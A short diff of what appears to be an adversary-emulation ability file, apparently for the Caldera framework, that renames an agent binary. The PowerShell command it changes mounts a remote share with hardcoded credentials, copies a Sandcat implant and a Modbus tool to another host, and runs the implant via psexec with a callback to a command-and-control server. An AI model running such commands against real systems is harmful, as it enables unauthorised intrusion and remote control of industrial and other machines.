@@ -10,10 +10,10 @@
       psh:
         command: |
           net use \\192.168.95.25 /user:txone 12345678;
-          Copy-Item -Path "C:\Users\Public\sandcat-upx.exe" -Destination "\\192.168.95.25\Users\Public\" -Force;
+          Copy-Item -Path "C:\Users\Public\sandcat-upx86.exe" -Destination "\\192.168.95.25\Users\Public\" -Force;
           Copy-Item -Path "C:\Users\Public\modbus_cli.exe" -Destination "\\192.168.95.25\Users\Public\" -Force;
-          Start-Process -FilePath "C:\Users\Public\psexec.exe" -ArgumentList '\\192.168.95.25', '-u', 'txone', '-p', '12345678', 'cmd', '/c', 'start "" "C:\Users\Public\sandcat-upx.exe" -server http://172.18.25.10:8888 -group tx2' -NoNewWindow;
+          Start-Process -FilePath "C:\Users\Public\psexec.exe" -ArgumentList '\\192.168.95.25', '-u', 'txone', '-p', '12345678', 'cmd', '/c', 'start "" "C:\Users\Public\sandcat-upx86.exe" -server http://172.18.25.10:8888 -group tx2' -NoNewWindow;
         payloads:
-          - sandcat-upx.exe
+          - sandcat-upx86.exe
           - modbus_cli.exe
           - psexec.exe
